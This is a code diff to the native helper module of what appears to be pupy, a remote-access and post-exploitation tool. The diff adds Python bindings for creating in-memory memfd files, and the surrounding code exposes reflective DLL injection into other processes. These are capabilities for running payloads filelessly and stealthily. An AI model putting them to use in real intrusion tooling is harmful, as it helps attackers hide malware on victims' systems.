@@ -28,7 +28,6 @@
 #include "revision.h"
 
 static const char module_doc[] = DOC("Builtins utilities for pupy");
-
 static PyObject *ExecError;
 
 #ifdef _FEATURE_PATHMAP
@@ -234,7 +233,55 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 }
 
 
+static PyObject *Py_memfd_is_supported(PyObject *self, PyObject *args)
+{
+    return PyBool_FromLong(pupy_memfd_supported());
+}
+
+
+static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwargs)
+{
+    char memfd_path[PATH_MAX] = {};
+    int fd = -1;
+    const char *name = "";
+    FILE *c_file;
+    PyObject *py_file;
+    PyObject *result;
+
+    static const char* kwargs_defs[] = {
+        "name", NULL
+    };
+
+    if (!PyArg_ParseTupleAndKeywords(args, kwargs, "|s", kwargs_defs, &name))
+        return NULL;
+
+    strncpy(memfd_path, name, sizeof(memfd_path));
+
+    dprint("Py_memfd_create(%s)\n", name);
+    fd = pupy_memfd_create(memfd_path, sizeof(memfd_path));
+
+    if (fd == -1)
+        return PyErr_SetFromErrno(PyExc_OSError);
+
+    c_file = fdopen(fd, "w+b");
+    if (!c_file) {
+        close(fd);
+        return PyErr_SetFromErrno(PyExc_OSError);
+    }
+
+    py_file = PyFile_FromFile(c_file, memfd_path, "w+b", fclose);
+    if (!py_file) {
+        close(fd);
+        return NULL;
+    }
+
+    result = Py_BuildValue("Os", py_file, memfd_path);
+    Py_DecRef(py_file);
+
+    return result;
+}
 #endif
+
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
@@ -382,6 +429,8 @@ static PyMethodDef methods[] = {
     { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
       DOC("reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure")
     },
+    { "memfd_is_supported", Py_memfd_is_supported, METH_VARARGS, DOC("Check memfd is supported") },
+    { "memfd_create", (PyCFunction) Py_memfd_create, METH_VARARGS | METH_KEYWORDS, DOC("Create memfd file") },
 #endif
     { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
     { "import_module", Py_import_module, METH_VARARGS,
